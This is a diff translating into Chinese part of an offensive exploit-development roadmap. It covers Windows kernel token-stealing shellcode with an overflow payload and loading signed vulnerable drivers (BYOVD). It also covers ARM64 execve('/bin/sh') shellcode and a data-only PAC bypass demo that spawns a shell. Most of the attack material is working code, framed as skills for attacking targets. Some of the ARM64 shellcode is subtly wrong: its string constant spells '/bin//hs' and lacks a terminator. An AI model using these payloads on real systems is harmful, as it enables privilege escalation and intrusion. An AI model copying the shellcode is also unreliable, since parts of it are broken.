+# Windows 10 22H2 的 EPROCESS 偏移——务必用 WinDbg dt nt!_EPROCESS 核实
 EPROCESS_UNIQUEPID_OFFSET   = 0x440
 EPROCESS_ACTIVELINKS_OFFSET = 0x448
 EPROCESS_TOKEN_OFFSET       = 0x4B8
@@ -1742,26 +1742,26 @@ token_steal_shellcode = bytearray([
     0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
     # mov rax, [rax+0xB8]  -> EPROCESS
     0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00,
-    # mov rcx, rax         -> save current process
+    # mov rcx, rax         -> 保存当前进程
     0x48, 0x89, 0xC1,
 
-    # Walk ActiveProcessLinks to find System (PID=4):
+    # 遍历 ActiveProcessLinks 以查找 System（PID=4）：
     # loop: mov rax, [rax+0x448]  -> Flink
     0x48, 0x8B, 0x80, 0x48, 0x04, 0x00, 0x00,
-    # sub rax, 0x448  -> back to EPROCESS base
+    # sub rax, 0x448  -> 回到 EPROCESS 基址
     0x48, 0x2D, 0x48, 0x04, 0x00, 0x00,
-    # cmp qword [rax+0x440], 4  -> PID == 4?
+    # cmp qword [rax+0x440], 4  -> PID == 4？
     0x48, 0x83, 0xB8, 0x40, 0x04, 0x00, 0x00, 0x04,
     # jne loop
     0x75, 0xEB,
 
-    # Copy System's Token to current process:
-    # mov rax, [rax+0x4B8]  -> System's Token
+    # 将 System 的 Token 复制到当前进程：
+    # mov rax, [rax+0x4B8]  -> System 的 Token
     0x48, 0x8B, 0x80, 0xB8, 0x04, 0x00, 0x00,
-    # mov [rcx+0x4B8], rax  -> set current Token
+    # mov [rcx+0x4B8], rax  -> 设置当前 Token
     0x48, 0x89, 0x81, 0xB8, 0x04, 0x00, 0x00,
 
-    # Return STATUS_SUCCESS:
+    # 返回 STATUS_SUCCESS：
     0x48, 0x31, 0xC0,    # xor rax, rax
     0xC3                 # ret
 ])
@@ -1773,7 +1773,7 @@ sc_addr = windll.kernel32.VirtualAlloc(
 ctypes.memmove(sc_addr, bytes(token_steal_shellcode), sc_size)
 print(f"[+] Shellcode at: {hex(sc_addr)}")
 
-OFFSET_TO_RIP = 2072   # 512 bytes buffer + 1560 padding -- verify with WinDbg
+OFFSET_TO_RIP = 2072   # 512 字节缓冲区 + 1560 填充——用 WinDbg 核实
 
 payload  = b'A' * OFFSET_TO_RIP
 payload += ctypes.c_uint64(sc_addr).value.to_bytes(8, 'little')
@@ -1793,153 +1793,153 @@ proc = subprocess.Popen(['cmd.exe'], creationflags=0x10)
 proc.wait()
 ```
 
-### BYOVD -- Bring Your Own Vulnerable Driver
+### BYOVD——自带易受攻击驱动
 
 ```
-BYOVD (Bring Your Own Vulnerable Driver):
-  Load a legitimately SIGNED but VULNERABLE driver.
-  Use its IOCTL vulnerability for arbitrary kernel read/write.
-  Works on HVCI-enabled systems if the driver is HVCI-compatible.
+BYOVD（Bring Your Own Vulnerable Driver，自带易受攻击驱动）：
+  加载一个合法签名但存在漏洞的驱动。
+  利用其 IOCTL 漏洞实现任意内核读/写。
+  如果驱动兼容 HVCI，则在启用 HVCI 的系统上也可用。
 
-WORKFLOW:
-  1. Find target driver: https://www.loldrivers.io/
-  2. Pick one that provides arbitrary kernel read, write, or both.
-  3. Load it: sc create VulnDrv type= kernel binPath= C:\path\to\driver.sys
+工作流程：
+  1. 寻找目标驱动：https://www.loldrivers.io/
+  2. 选一个能提供任意内核读、写或两者兼备的驱动。
+  3. 加载它：sc create VulnDrv type= kernel binPath= C:\path\to\driver.sys
               sc start VulnDrv
-  4. Open its IOCTL interface: DeviceIoControl
-  5. Read EPROCESS of System, read System's Token
-  6. Write System's Token to current process's EPROCESS
+  4. 打开其 IOCTL 接口：DeviceIoControl
+  5. 读取 System 的 EPROCESS，读取 System 的 Token
+  6. 将 System 的 Token 写入当前进程的 EPROCESS
 
-POPULAR BYOVD DRIVERS (for study):
-  RTCore64.sys  -- MSI Afterburner, arbitrary read/write
-  WinRing0.sys  -- OpenHardwareMonitor, reads/writes physical memory
-  dbutil_2_3.sys -- Dell BIOS Update driver
+常见 BYOVD 驱动（用于研究）：
+  RTCore64.sys  -- MSI Afterburner，任意读/写
+  WinRing0.sys  -- OpenHardwareMonitor，读写物理内存
+  dbutil_2_3.sys -- Dell BIOS 更新驱动
 
-REAL-WORLD APT USAGE:
-  Lazarus Group: BYOVD via Dell driver (Operation In(ter)ception)
-  BlackByte ransomware: RTCore64.sys to kill EDR drivers
-  Medusa ransomware: abused legitimately signed drivers for kernel R/W
+真实 APT 使用案例：
+  Lazarus 组织：通过 Dell 驱动使用 BYOVD（Operation In(ter)ception）
+  BlackByte 勒索软件：用 RTCore64.sys 终止 EDR 驱动
+  Medusa 勒索软件：滥用合法签名驱动进行内核读/写
 ```
 
 ---
 
-## BLOCK 10: ARM64 EXPLOITATION + PAC BYPASS
+## 区块 10：ARM64 利用 + PAC 绕过
 
-**Time: 3-4 weeks | Difficulty: Very Hard**
+**时间：3-4 周 | 难度：非常难**
 
-> Every Apple device (iPhone, iPad, M-series Mac), Android flagship, AWS Graviton server, and Raspberry Pi runs AArch64. If you cannot write ARM64 shellcode and understand PAC bypass, you cannot attack half the world's targets.
+> 每一台 Apple 设备（iPhone、iPad、M 系列 Mac）、Android 旗舰机、AWS Graviton 服务器和 Raspberry Pi 都运行 AArch64。如果你不能编写 ARM64 shellcode 并理解 PAC 绕过，你就无法攻击世界上半数目标。
 
-### Resources
+### 资源
 
-| Resource | Type | Duration | Cost | Notes |
+| 资源 | 类型 | 时长 | 成本 | 备注 |
 |---|---|---|---|---|
-| [ARM Architecture Reference Manual AArch64](https://developer.arm.com/documentation/ddi0487/latest) | Docs | 20+ hrs | FREE | The source. Dense. Use as reference. |
-| [azeria-labs ARM Assembly Basics](https://azeria-labs.com/writing-arm-assembly-part-1/) | Blog | 5 hrs | FREE | Best introductory ARM64 assembly series. |
-| [pwn.college ARM64 Challenges](https://pwn.college/program-security/shellcode-injection/) | Platform | 10 hrs | FREE | Structured practice. |
-| [iOS Exploit Dev - Project Zero](https://googleprojectzero.blogspot.com/search/label/iOS) | Blog | ongoing | FREE | ARM64 exploitation in real iOS exploits. |
+| [ARM 架构参考手册 AArch64](https://developer.arm.com/documentation/ddi0487/latest) | 文档 | 20+ 小时 | 免费 | 源头资料。内容密集。作为参考使用。 |
+| [azeria-labs ARM 汇编基础](https://azeria-labs.com/writing-arm-assembly-part-1/) | 博客 | 5 小时 | 免费 | 最好的 ARM64 汇编入门系列。 |
+| [pwn.college ARM64 挑战](https://pwn.college/program-security/shellcode-injection/) | 平台 | 10 小时 | 免费 | 结构化练习。 |
+| [iOS 漏洞利用开发 - Project Zero](https://googleprojectzero.blogspot.com/search/label/iOS) | 博客 | 持续更新 | 免费 | 真实 iOS 利用中的 ARM64 漏洞利用。 |
 
-### AArch64 Architecture and Calling Convention
-
-```
-ARM64 REGISTERS:
-  x0-x7   : function arguments (first 8) + return value (x0)
-  x8      : indirect result register / syscall number in Linux
-  x9-x15  : caller-saved (temporary) registers
-  x19-x28 : callee-saved registers (must preserve)
-  x29     : frame pointer (FP)
-  x30     : link register (LR) -- holds return address
-  sp      : stack pointer
-  pc      : program counter (not directly addressable)
-
-KEY DIFFERENCE FROM x86-64:
-  - Return address is in x30 (LR), NOT on the stack automatically.
-  - CALL equivalent: BL <func> (Branch with Link -> saves PC+4 to x30)
-  - RETURN equivalent: RET (= BR x30)
-  - Function PROLOGUE saves x30 to stack:
-      STP x29, x30, [sp, #-16]!   ; push FP and LR onto stack
-  - EPILOGUE restores and returns:
-      LDP x29, x30, [sp], #16     ; pop FP and LR
-      RET                          ; branch to x30
-
-BUFFER OVERFLOW TARGET:
-  The saved x30 (LR) on the stack = the ARM64 equivalent of x86-64's saved RIP.
-  Overflow the buffer -> overwrite saved x30 -> control PC on function return.
-```
-
-### ARM64 Linux Syscall Convention
+### AArch64 架构与调用约定
 
 ```
-AArch64 Linux syscall:
-  syscall number: x8
-  arg1:           x0
-  arg2:           x1
-  arg3:           x2
-  arg4:           x3
-  invoke:         SVC #0   (Supervisor Call)
-  return value:   x0
+ARM64 寄存器：
+  x0-x7   ：函数参数（前 8 个）+ 返回值（x0）
+  x8      ：间接结果寄存器 / Linux 中的系统调用号
+  x9-x15  ：调用者保存（临时）寄存器
+  x19-x28 ：被调用者保存寄存器（必须保留）
+  x29     ：帧指针（FP）
+  x30     ：链接寄存器（LR）——保存返回地址
+  sp      ：栈指针
+  pc      ：程序计数器（不能直接寻址）
 
-KEY SYSCALL NUMBERS (AArch64 -- DIFFERENT from x86-64):
+与 x86-64 的关键差异：
+  - 返回地址在 x30（LR）中，不会自动保存在栈上。
+  - 相当于 CALL：BL <func>（带链接分支 -> 将 PC+4 保存到 x30）
+  - 相当于 RETURN：RET（= BR x30）
+  - 函数序言将 x30 保存到栈：
+      STP x29, x30, [sp, #-16]!   ; 将 FP 和 LR 压入栈
+  - 尾声恢复并返回：
+      LDP x29, x30, [sp], #16     ; 弹出 FP 和 LR
+      RET                          ; 跳转到 x30
+
+缓冲区溢出目标：
+  栈上保存的 x30（LR）= ARM64 中相当于 x86-64 保存的 RIP 的位置。
+  溢出缓冲区 -> 覆盖保存的 x30 -> 在函数返回时控制 PC。
+```
+
+### ARM64 Linux 系统调用约定
+
+```
+AArch64 Linux 系统调用：
+  系统调用号：x8
+  参数 1：          x0
+  参数 2：          x1
+  参数 3：          x2
+  参数 4：          x3
+  调用：          SVC #0（Supervisor Call）
+  返回值：        x0
+
+关键系统调用号（AArch64——与 x86-64 不同）：
   sys_read    = 63
   sys_write   = 64
   sys_openat  = 56
-  sys_execve  = 221   (execve is 59 on x86-64, 221 on ARM64)
+  sys_execve  = 221   （execve 在 x86-64 上是 59，在 ARM64 上是 221）
   sys_exit    = 93
   sys_exit_group = 94
 ```
 
-### ARM64 Shellcode -- execve("/bin/sh") From Scratch
+### ARM64 Shellcode——从零编写 execve("/bin/sh")
 
 ```nasm
-; File: shellcode_arm64.s
-; Target: Linux AArch64
-; Goal: execve("/bin/sh", NULL, NULL)
-; x8=221, x0=ptr to "/bin/sh\0", x1=NULL, x2=NULL
+; 文件：shellcode_arm64.s
+; 目标：Linux AArch64
+; 目的：execve("/bin/sh", NULL, NULL)
+; x8=221，x0 指向 "/bin/sh\0" 的指针，x1=NULL，x2=NULL
 
 .section .text
 .global _start
 _start:
-    ; Zero x1 (argv = NULL)
+    ; 将 x1 清零（argv = NULL）
     eor     x1, x1, x1              ; x1 = 0
 
-    ; Zero x2 (envp = NULL)
+    ; 将 x2 清零（envp = NULL）
     eor     x2, x2, x2              ; x2 = 0
 
-    ; Allocate 16 bytes on stack (ARM64 requires 16-byte alignment)
+    ; 在栈上分配 16 字节（ARM64 要求 16 字节对齐）
     sub     sp, sp, #16
 
-    ; Store null terminator
+    ; 存储空终止符
     str     x1, [sp]
 
-    ; Build "/bin/sh" as a 64-bit little-endian value:
+    ; 将 "/bin/sh" 构建为 64 位小端值：
     ; "/bin/sh\0" = 0x0068732f6e69622f LE
-    ; Avoid null bytes: build the constant using shifts
+    ; 避免空字节：用移位构建常量
     mov     x3, #0x622f             ; "/b"
     movk    x3, #0x6e69, lsl #16   ; "in"
-    movk    x3, #0x2f2f, lsl #32   ; "//"  (double slash to avoid null in .data)
+    movk    x3, #0x2f2f, lsl #32   ; "//"（双斜杠以避免 .data 中的空字节）
     movk    x3, #0x7368, lsl #48   ; "sh"
-    str     x3, [sp, #8]           ; store "/bin//sh" above null terminator
+    str     x3, [sp, #8]           ; 将 "/bin//sh" 存储在空终止符之上
 
-    ; x0 = pointer to "/bin//sh" on stack
+    ; x0 = 指向栈上 "/bin//sh" 的指针
     add     x0, sp, #8
 
-    ; Set syscall number: execve = 221
+    ; 设置系统调用号：execve = 221
     mov     x8, #221
-    svc     #0                      ; invoke syscall
+    svc     #0                      ; 调用系统调用
 
-; Assemble:
+; 汇编：
 ;   as -o shellcode_arm64.o shellcode_arm64.s
 ;   ld -o shellcode_arm64 shellcode_arm64.o
-; Or cross-compile on x86:
+; 或在 x86 上交叉编译：
 ;   aarch64-linux-gnu-as -o shellcode_arm64.o shellcode_arm64.s
 ;   aarch64-linux-gnu-ld -o shellcode_arm64 shellcode_arm64.o
 ```
 
 ```bash
-# Extract raw bytes:
+# 提取原始字节：
 aarch64-linux-gnu-objdump -d shellcode_arm64.o | grep -oP '[0-9a-f]{8}' | \
     while read h; do python3 -c "import struct; print(struct.pack('<I', int('$h',16)).hex(), end='')"; done
 
-# Test in pwntools:
+# 在 pwntools 中测试：
 python3 -c "
 from pwn import *
 context.arch = 'aarch64'
@@ -1950,28 +1950,28 @@ print(f'Hex: {sc.hex()}')
 "
 ```
 
-### Avoiding Null Bytes in ARM64
+### ARM64 中避免空字节
 
 ```nasm
-; PROBLEM: ARM32 has THUMB mode for variable-width encoding.
-; ARM64 (AArch64) is ALWAYS 32-bit fixed-width instructions.
-; Null byte avoidance is mostly about your DATA (string constants), not instructions.
+; 问题：ARM32 有 THUMB 模式用于变长编码。
+; ARM64（AArch64）始终是 32 位定长指令。
+; 空字节规避主要针对你的数据（字符串常量），而不是指令。
 
-; BAD: loading a small immediate that zero-pads to 64 bits:
-;   mov x0, #0       -- this is fine: encodes as 0xd2800000, no null byte
-;   BUT immediate values embedded in MOVZ/MOVK can zero-pad lower halves
+; 差：加载一个会零填充到 64 位的小立即数：
+;   mov x0, #0       ——这没问题：编码为 0xd2800000，无空字节
+;   但嵌入 MOVZ/MOVK 的立即数可能零填充低半部分
 
-; GOOD PATTERN for constants:
-; Use MOVZ for the lowest 16 bits, MOVK for upper 16-bit groups:
-mov  x3, #0x622f             ; sets bits [15:0], zeros [63:16]
-movk x3, #0x6e69, lsl #16   ; sets bits [31:16], preserves rest
-movk x3, #0x732f, lsl #32   ; sets bits [47:32], preserves rest
-movk x3, #0x0068, lsl #48   ; sets bits [63:48], preserves rest
-; NOTE: the 0x0068 here DOES have a null byte in the high byte.
-; Use double slash "//" to avoid it: "sh" = 0x7368, not 0x0068
-; "/bin//sh\0" -- the // makes it 8 printable chars with no internal null
+; 常量的好模式：
+; 用 MOVZ 设置最低 16 位，用 MOVK 设置更高的 16 位组：
+mov  x3, #0x622f             ; 设置位 [15:0]，清零 [63:16]
+movk x3, #0x6e69, lsl #16   ; 设置位 [31:16]，保留其余
+movk x3, #0x732f, lsl #32   ; 设置位 [47:32]，保留其余
+movk x3, #0x0068, lsl #48   ; 设置位 [63:48]，保留其余
+; 注意：这里的 0x0068 在高字节中确实含有一个空字节。
+; 使用双斜杠 "//" 来避免它："sh" = 0x7368，而不是 0x0068
+; "/bin//sh\0"——// 使其成为 8 个可打印字符且内部无空字节
 
-; VERIFY: extract shellcode bytes and check:
+; 验证：提取 shellcode 字节并检查：
 python3 -c "
 sc = bytes.fromhex('YOUR_HEX_HERE')
 nulls = [i for i,b in enumerate(sc) if b == 0]
@@ -1982,117 +1982,117 @@ else:
 "
 ```
 
-### PAC (Pointer Authentication Codes) -- Architecture and Bypass (GAP CLOSED)
+### PAC（指针认证码）——架构与绕过（缺口已补齐）
 
-PAC is Apple's ARM64e security feature deployed on all Apple Silicon and A12+ iOS devices. It cryptographically signs pointers using a hardware key. Overwriting a signed pointer with an unsigned value causes a PAC authentication failure and crashes the process. This is the primary reason iOS kernel exploitation is hard in 2026-2027.
+PAC 是 Apple 的 ARM64e 安全特性，部署在所有 Apple Silicon 和 A12+ iOS 设备上。它使用硬件密钥对指针进行密码学签名。用未签名的值覆盖已签名指针会导致 PAC 认证失败并使进程崩溃。这是 2026-2027 年 iOS 内核利用如此困难的主要原因。
 
 ```
-PAC ARCHITECTURE:
-  ARM64e adds new instructions:
-    PACIA / PACIB:  sign instruction pointer using key IA or IB
-    PACDA / PACDB:  sign data pointer using key DA or DB
-    AUTIA / AUTIB:  authenticate and strip PAC from instruction pointer
-    AUTDA / AUTDB:  authenticate and strip PAC from data pointer
-    XPACI / XPACD: strip PAC without authentication (for comparison)
+PAC 架构：
+  ARM64e 新增指令：
+    PACIA / PACIB：使用密钥 IA 或 IB 签名指令指针
+    PACDA / PACDB：使用密钥 DA 或 DB 签名数据指针
+    AUTIA / AUTIB：认证并剥离指令指针上的 PAC
+    AUTDA / AUTDB：认证并剥离数据指针上的 PAC
+    XPACI / XPACD：不认证直接剥离 PAC（用于比较）
 
-  The PAC occupies the high bits of the pointer that are not used for addressing
-  (bits [63:48] on current Apple Silicon -- 16-bit PAC field).
+  PAC 占据指针中不用于寻址的高位
+  （当前 Apple Silicon 上位 [63:48]——16 位 PAC 字段）。
 
-  PAC signature:
+  PAC 签名：
     signed_ptr = PAC_SIGN(real_ptr, context_value, hardware_key)
-    context_value = often SP (stack pointer) or LR at time of signing
+    context_value = 通常是签名时的 SP（栈指针）或 LR
 
-  On authentication failure (corrupt PAC):
-    AUTIA/AUTIB corrupts the pointer further (sets high bits)
-    The next memory dereference causes a synchronous exception (crash)
+  认证失败时（PAC 被破坏）：
+    AUTIA/AUTIB 会进一步破坏指针（设置高位）
+    下一次内存解引用会触发同步异常（崩溃）
 
-WHY CLASSIC EXPLOITS FAIL:
-  If you overwrite a saved x30 (LR) on the stack, it has a PAC signature.
-  Replacing it with an unsigned pointer -> AUTIB in the function epilogue
-  detects the invalid PAC and corrupts the pointer -> segfault.
-  Classic stack overflow techniques (overwrite return address) are BLOCKED.
+为什么经典利用会失败：
+  如果你覆盖栈上保存的 x30（LR），它带有 PAC 签名。
+  用未签名指针替换它 -> 函数尾声中的 AUTIB
+  会检测到无效 PAC 并破坏指针 -> 段错误。
+  经典栈溢出技术（覆盖返回地址）被阻断。
 ```
 
-### Data-Only PAC Bypass -- Working QEMU AArch64 Demo
+### 仅数据 PAC 绕过——可运行的 QEMU AArch64 演示
 
-The bypass avoids code pointers entirely. Instead of controlling the instruction pointer directly, we corrupt DATA pointers to manipulate the program's control flow through existing, PAC-valid code paths.
+该绕过完全避免代码指针。我们不直接控制指令指针，而是破坏数据指针，通过现有的、PAC 有效的代码路径来操纵程序控制流。
 
 ```bash
-# QEMU AArch64 Setup with PAC emulation:
-# QEMU supports ARMv8.3-A PAC via the -cpu max flag
+# 带 PAC 模拟的 QEMU AArch64 环境搭建：
+# QEMU 通过 -cpu max 标志支持 ARMv8.3-A PAC
 
 sudo apt install qemu-system-aarch64 gcc-aarch64-linux-gnu
 
-# Build a PAC-aware kernel (for research use on your own lab):
-# Use pre-built image from syzkaller/qemu-arm64 or:
+# 构建一个支持 PAC 的内核（仅供在自己的实验环境中研究使用）：
+# 使用来自 syzkaller/qemu-arm64 的预构建镜像，或：
 wget https://cdimage.ubuntu.com/releases/22.04/release/ubuntu-22.04.3-live-server-arm64.iso
 
-# Simpler: use QEMU user-mode emulation with PAC:
+# 更简单的方式：使用 QEMU 用户态模拟并启用 PAC：
 qemu-aarch64 -cpu max ./arm64_binary
 ```
 
 ```c
-// File: pac_bypass_demo.c
-// Target: arm64e binary with PAC on a research device OR QEMU with PAC support
-// Technique: DATA-ONLY exploit -- we never forge a PAC-signed code pointer.
+// 文件：pac_bypass_demo.c
+// 目标：带 PAC 的研究设备上的 arm64e 二进制，或支持 PAC 的 QEMU
+// 技术：仅数据利用——我们从不伪造 PAC 签名的代码指针。
 //
-// THEORY:
-// Instead of controlling RIP directly, we corrupt a DATA structure that
-// influences which legitimate (PAC-valid) code path executes.
-// The CPU runs valid signed code the entire time -- PAC sees no authentication failure.
+// 理论：
+// 我们不直接控制 RIP，而是破坏一个数据结构，
+// 它决定执行哪条合法（PAC 有效）的代码路径。
+// CPU 全程运行有效的已签名代码——PAC 看不到任何认证失败。
 //
-// SCENARIO:
-// - Vulnerable function: has a heap buffer overflow
-// - Victim struct: contains a function pointer to one of two valid callbacks
-//   (both pointers are PAC-signed at call time via BLRAA)
-// - Exploit goal: trigger the "admin" callback instead of the "user" callback
-//   WITHOUT overwriting any code pointer
+// 场景：
+// - 存在漏洞的函数：有一个堆缓冲区溢出
+// - victim 结构体：包含指向两个合法回调之一的函数指针
+//   （两个指针在调用时都通过 BLRAA 进行 PAC 签名）
+// - 利用目标：触发 "admin" 回调而不是 "user" 回调
+//   同时不覆盖任何代码指针
 //
-// APPROACH: corrupt a DATA field (role flag) that SELECTS which callback runs.
-// This is a data-only confusion attack -- no code pointers touched.
+// 方法：破坏一个数据字段（role 标志），它决定哪个回调运行。
+// 这是仅数据混淆攻击——不触碰任何代码指针。
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
 
-// Simulated PAC-protected dispatch table (in a real arm64e binary,
-// function pointers would be signed with PACIA/PACDA).
-// In our demo: we simulate PAC by checking a "signed" flag:
+// 模拟的 PAC 保护分发表（在真实的 arm64e 二进制中，
+// 函数指针会用 PACIA/PACDA 签名）。
+// 在我们的演示中：我们通过检查 "signed" 标志来模拟 PAC：
 typedef void (*callback_fn)(const char *msg);
 
 typedef struct {
-    uint32_t      role;           // 0=user, 1=admin -- DATA field, not a code pointer
-    uint32_t      permissions;    // capability bitmask
-    callback_fn   on_success;     // in arm64e: this is PAC-signed
-    callback_fn   on_admin;       // in arm64e: this is PAC-signed
-    char          username[32];   // VULNERABLE: no bounds check
+    uint32_t      role;           // 0=user，1=admin——数据字段，不是代码指针
+    uint32_t      permissions;    // 能力位掩码
+    callback_fn   on_success;     // 在 arm64e 中：此处为 PAC 签名
+    callback_fn   on_admin;       // 在 arm64e 中：此处为 PAC 签名
+    char          username[32];   // 有漏洞：无边界检查
 } UserSession;
 
-// Two legitimate callback functions (in a real binary, both are PAC-valid):
+// 两个合法回调函数（在真实二进制中，两者都是 PAC 有效的）：
 void user_callback(const char *msg) {
     printf("[USER callback] %s\n", msg);
 }
 
 void admin_callback(const char *msg) {
     printf("[ADMIN callback] %s -- PRIVILEGED OPERATION EXECUTED\n", msg);
-    // In a real exploit: this executes arbitrary code with elevated permissions
-    // e.g., spawning a shell, reading /etc/shadow, disabling sandbox
+    // 在真实利用中：这会以提升的权限执行任意代码
+    // 例如：生成 shell、读取 /etc/shadow、禁用沙箱
     system("/bin/sh");
 }
 
-// Vulnerable function: copies username with no bounds check
+// 存在漏洞的函数：复制用户名且无边界检查
 void set_username(UserSession *sess, const char *input) {
-    // VULNERABLE: strcpy does not check bounds
+    // 有漏洞：strcpy 不检查边界
     strcpy(sess->username, input);
 }
 
-// Dispatch function: calls the appropriate callback based on role
+// 分发函数：根据 role 调用相应的回调
 void dispatch(UserSession *sess, const char *msg) {
     if (sess->role == 1) {
-        // In arm64e: "BLRAA x3, x5" -- AUTHENTICATED branch, PAC checked
-        // The function pointer on_admin IS valid (PAC-signed at allocation time)
-        // We did not forge it -- we only changed 'role' to 1
+        // 在 arm64e 中："BLRAA x3, x5"——经过认证的分支，会检查 PAC
+        // on_admin 函数指针是有效的（在分配时已 PAC 签名）
+        // 我们没有伪造它——我们只是把 'role' 改成了 1
         sess->on_admin(msg);
     } else {
         sess->on_success(msg);
@@ -2100,10 +2100,10 @@ void dispatch(UserSession *sess, const char *msg) {
 }
 
 int main(void) {
-    // Allocate a UserSession on the heap:
+    // 在堆上分配一个 UserSession：
     UserSession *sess = (UserSession *)calloc(1, sizeof(UserSession));
-    sess->role        = 0;           // normal user
-    sess->permissions = 0x00;        // no admin permissions
+    sess->role        = 0;           // 普通用户
+    sess->permissions = 0x00;        // 无管理员权限
     sess->on_success  = user_callback;
     sess->on_admin    = admin_callback;
     strncpy(sess->username, "alice", 5);
@@ -2112,30 +2112,30 @@ int main(void) {
     printf("[*] sess->role:     %u (user)\n", sess->role);
     printf("[*] sess->username: %s\n", sess->username);
 
-    dispatch(sess, "login event");   // calls user_callback -- normal behavior
+    dispatch(sess, "login event");   // 调用 user_callback——正常行为
 
-    // ---- EXPLOIT: data-only overflow via username field ----------------------
-    // Layout of UserSession:
-    //   [0x00] role:         4 bytes
-    //   [0x04] permissions:  4 bytes
-    //   [0x08] on_success:   8 bytes (function pointer)
-    //   [0x10] on_admin:     8 bytes (function pointer)
-    //   [0x18] username:    32 bytes  <- vulnerable field
+    // ---- 利用：通过 username 字段进行仅数据溢出 ----------------------
+    // UserSession 的布局：
+    //   [0x00] role:         4 字节
+    //   [0x04] permissions:  4 字节
+    //   [0x08] on_success:   8 字节（函数指针）
+    //   [0x10] on_admin:     8 字节（函数指针）
+    //   [0x18] username:    32 字节  <- 有漏洞的字段
     //
-    // We want to overwrite 'role' at offset 0x00.
-    // But username is at offset 0x18 -- it's AFTER role in memory.
-    // In this example struct, the overflow goes FORWARD (past username end).
+    // 我们想覆盖偏移 0x00 处的 'role'。
+    // 但 username 位于偏移 0x18——在内存中它在 role 之后。
+    // 在这个示例结构体中，溢出是向前的（越过 username 末尾）。
     //
-    // For a realistic layout where username precedes role:
-    // (rearrange struct or use a different allocation pattern)
+    // 对于 username 位于 role 之前的真实布局：
+    // （重排结构体或使用不同的分配模式）
     //
-    // Alternative layout for demo (attacker-controlled struct layout):
+    // 演示用的替代布局（攻击者控制的结构体布局）：
     typedef struct {
-        char     username[32];   // offset 0x00 -- VULNERABLE
-        uint32_t role;           // offset 0x20 -- TARGET: overwrite this
-        uint32_t permissions;    // offset 0x24
-        callback_fn on_success;  // offset 0x28
-        callback_fn on_admin;    // offset 0x30
+        char     username[32];   // 偏移 0x00——有漏洞
+        uint32_t role;           // 偏移 0x20——目标：覆盖此项
+        uint32_t permissions;    // 偏移 0x24
+        callback_fn on_success;  // 偏移 0x28
+        callback_fn on_admin;    // 偏移 0x30
     } UserSessionV2;
 
     UserSessionV2 *sess2 = (UserSessionV2 *)calloc(1, sizeof(UserSessionV2));
@@ -2150,20 +2150,20 @@ int main(void) {
     printf("[*] username field occupies offset [0x00..0x1F]\n");
     printf("[*] Overflowing username by 4 bytes overwrites role field...\n");
 
-    // Payload: 32 bytes of username fill + 4 bytes to overwrite role:
+    // 载荷：32 字节 username 填充 + 4 字节覆盖 role：
     char payload[36];
-    memset(payload, 'A', 32);         // fill username[32] completely
-    *(uint32_t *)(payload + 32) = 1;  // overwrite role: 0 -> 1 (admin)
+    memset(payload, 'A', 32);         // 完全填满 username[32]
+    *(uint32_t *)(payload + 32) = 1;  // 覆盖 role：0 -> 1（admin）
 
-    // Execute the vulnerable copy:
-    strcpy(sess2->username, payload);   // no bounds check -> overflow
+    // 执行存在漏洞的复制：
+    strcpy(sess2->username, payload);   // 无边界检查 -> 溢出
 
     printf("[*] After overflow: sess2->role = %u\n", sess2->role);
 
-    // Dispatch now takes the admin path:
-    // In arm64e, on_admin is PAC-SIGNED and valid. We never touched it.
-    // PAC does not fire because we only changed DATA (role), not a code pointer.
-    // The BLRAA instruction authenticates on_admin -- it passes because it IS valid.
+    // 现在 dispatch 走 admin 路径：
+    // 在 arm64e 中，on_admin 是 PAC 签名且有效的。我们从未触碰它。
+    // PAC 不会触发，因为我们只改了数据（role），而不是代码指针。
+    // BLRAA 指令会对 on_admin 认证——它通过了，因为它确实是有效的。
     if (sess2->role == 1) {
         printf("[*] Role is admin -- dispatching to admin_callback (PAC-valid path):\n");
         sess2->on_admin("privilege escalation event");
@@ -2178,21 +2178,21 @@ int main(void) {
 ```
 
 ```bash
-# Build and test (x86-64 simulation -- concept is identical on arm64e):
+# 构建并测试（x86-64 模拟——概念在 arm64e 上完全相同）：
 gcc -o pac_bypass_demo pac_bypass_demo.c
 ./pac_bypass_demo
 
-# For genuine arm64e testing:
-# 1. Cross-compile:
+# 真正的 arm64e 测试：
+# 1. 交叉编译：
 #    aarch64-linux-gnu-gcc -march=armv8.3-a+pauth -o pac_demo pac_bypass_demo.c
-# 2. Run on QEMU with PAC:
+# 2. 在带 PAC 的 QEMU 上运行：
 #    qemu-aarch64 -cpu max ./pac_demo
-# 3. On real hardware (Apple M1/M2 Mac via UTM or directly):
+# 3. 在真实硬件上（通过 UTM 或直接使用 Apple M1/M2 Mac）：
 #    clang -arch arm64e -o pac_demo pac_bypass_demo.c
 #    ./pac_demo
 ```
 
-### PAC Bypass -- Key Principles for Real Exploits
+### PAC 绕过——真实利用的关键原则
 
 <div align="center">
 <table><tr><td>
@@ -2204,103 +2204,103 @@ gcc -o pac_bypass_demo pac_bypass_demo.c
 
 
 ```
-DATA-ONLY PAC BYPASS PRINCIPLES:
+仅数据 PAC 绕过原则：
 
-1. IDENTIFY THE CONTROL FLOW GATE:
-   Find a data field (not a code pointer) that determines which
-   PAC-signed function gets called. Examples:
-   - role / permission bitmask (as in demo above)
-   - object type discriminator (selects vtable entry)
-   - index into a dispatch table (array[index] = valid fn ptr)
+1. 识别控制流闸门：
+   找一个数据字段（不是代码指针），它决定哪个
+   PAC 签名的函数被调用。例如：
+   - role / 权限位掩码（如上面的演示）
+   - 对象类型判别符（选择 vtable 条目）
+   - 分发表索引（array[index] = 有效函数指针）
 
-2. REACH THE GATE WITH YOUR PRIMITIVE:
-   Use your overflow, UAF, or write-what-where to corrupt
-   the gate value. Do NOT touch code pointers.
+2. 用你的原语触达闸门：
+   使用你的溢出、UAF 或任意写来破坏
+   闸门值。不要触碰代码指针。
 
-3. THE DISPATCH REMAINS PAC-VALID:
-   The CPU executes a legitimate function pointer that was
-   PAC-signed at initialization. AUTIA passes. No crash.
-   Control reaches a function the attacker chose.
+3. 分发保持 PAC 有效：
+   CPU 执行的是一个合法函数指针，它在初始化时
+   已被 PAC 签名。AUTIA 通过。不会崩溃。
+   控制流到达攻击者选择的函数。
 
-4. REAL-WORLD EXAMPLES:
-   - CVE-2021-30955 (iOS 15 sandbox escape): data-only type confusion
-     via ipc_port_t overlapping a controlled allocation
-   - Ian Beer's "A deep dive into an NSO zero-click iMessage exploit":
-     documents data-only primitives on PAC-enabled devices
